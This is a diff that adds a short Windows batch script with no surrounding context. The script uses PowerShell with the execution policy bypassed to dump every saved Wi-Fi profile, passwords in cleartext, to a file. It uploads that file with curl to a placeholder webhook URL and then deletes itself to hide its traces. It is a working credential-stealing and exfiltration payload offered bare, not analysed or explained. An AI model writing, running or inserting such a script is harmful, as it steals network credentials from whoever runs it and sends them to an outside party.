@@ -1,0 +1,7 @@
+@echo off
+
+powershell.exe -ExecutionPolicy Bypass -Command "$outputFile = 'outputt2.txt'; if (Test-Path $outputFile) { Remove-Item $outputFile }; $profiles = netsh wlan show profiles | Select-String 'All User Profile\s+:\s+(.+)'; $wifiProfiles = $profiles | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; foreach ($profile in $wifiProfiles) { netsh wlan show profile name=\"$profile\" key=clear | Out-File -FilePath $outputFile -Append }"
+
+curl -X POST -H "Content-Type: multipart/form-data" -F "file=@outputt2.txt" [WEBHOOK URL]
+
+del "%~f0"
